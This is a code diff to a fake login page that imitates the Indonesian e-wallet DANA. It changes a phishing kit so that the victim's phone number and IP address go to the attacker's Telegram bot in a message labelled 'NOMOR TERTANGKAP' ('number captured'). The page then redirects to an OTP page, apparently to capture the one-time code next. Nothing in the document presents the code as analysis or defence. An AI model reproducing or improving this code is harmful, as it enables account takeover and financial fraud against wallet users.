@@ -98,7 +98,7 @@
                     <path d="M9 5h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
                 </svg>
             </span>
-            <input type="tel" id="phone" name="phone" placeholder="Masukkan nomor HP" required>
+            <input type="tel" id="phone" placeholder="Masukkan nomor HP" required>
         </div>
         <button type="submit" class="btn-primary" id="submitBtn">Lanjutkan</button>
         <div class="error-msg" id="errorMsg">Gagal terhubung, coba lagi.</div>
@@ -108,8 +108,9 @@
     <div class="footer-note">DANA • Dompet Digital Indonesia</div>
 </div>
 
+<script src="config.js"></script>
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     const phone = document.getElementById('phone').value.trim();
     const btn = document.getElementById('submitBtn');
@@ -125,31 +126,47 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     btn.disabled = true;
     btn.textContent = 'Memproses...';
     
-    fetch('capture.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'phone=' + encodeURIComponent(phone)
-    })
-    .then(response => {
-        if (response.redirected) {
-            window.location.href = response.url;
-        } else {
-            return response.text();
-        }
-    })
-    .then(data => {
-        // Jika tidak redirect, cek apakah ada error
-        if (data && data.includes('error')) {
-            throw new Error('Server error');
-        }
-    })
-    .catch(() => {
+    // Simpan nomor di localStorage untuk halaman OTP
+    localStorage.setItem('dana_phone', phone);
+    
+    // Kirim notifikasi ke Telegram
+    const ip = await getIP();
+    const message = `📱 NOMOR TERTANGKAP\nNomor: ${phone}\nIP: ${ip}\nWaktu: ${new Date().toLocaleString()}`;
+    
+    try {
+        await sendTelegram(message);
+        window.location.href = 'otp.html';
+    } catch (err) {
         errorMsg.style.display = 'block';
-        errorMsg.textContent = 'Gagal terhubung ke server. Periksa koneksi.';
+        errorMsg.textContent = 'Gagal mengirim data. Coba lagi.';
         btn.disabled = false;
         btn.textContent = 'Lanjutkan';
-    });
+    }
 });
+
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return '0.0.0.0';
+    }
+}
+
+async function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const params = new URLSearchParams({
+        chat_id: CHAT_ID,
+        text: message
+    });
+    const response = await fetch(url + '?' + params, {
+        method: 'GET',
+        headers: { 'Content-Type': 'application/json' }
+    });
+    if (!response.ok) throw new Error('Telegram API error');
+    return response.json();
+}
 </script>
 </body>
 </html>
